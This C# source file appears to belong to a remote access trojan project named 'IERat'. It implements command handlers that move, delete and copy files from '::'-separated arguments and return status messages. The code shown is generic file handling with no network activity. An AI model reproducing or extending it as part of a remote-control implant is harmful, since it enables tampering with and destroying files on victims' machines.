using System;
using System.IO;

namespace IERat.lib.Actions
{
    class FileOperations
    {
        public static string mv(string args)
        {
            try
            {
                string filetomv = args.Split(new string[] { "::" }, StringSplitOptions.None)[0];
                string mvwhere = args.Split(new string[] { "::" }, StringSplitOptions.None)[1];
                File.Move(filetomv, mvwhere);
                return "File moved successfully.";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static string rm(string args)
        {
            try
            {
                string filetodel = args;
                File.Delete(filetodel);
                return "File deleted successfully.";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        public static string cp(string args)
        {
            try
            {
                string copyfrom = args.Split(new string[] { "::" }, StringSplitOptions.None)[0];
                string copyto = args.Split(new string[] { "::" }, StringSplitOptions.None)[1];
                File.Copy(copyfrom, copyto, true);
                return "File copied successfully.";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
    }
}
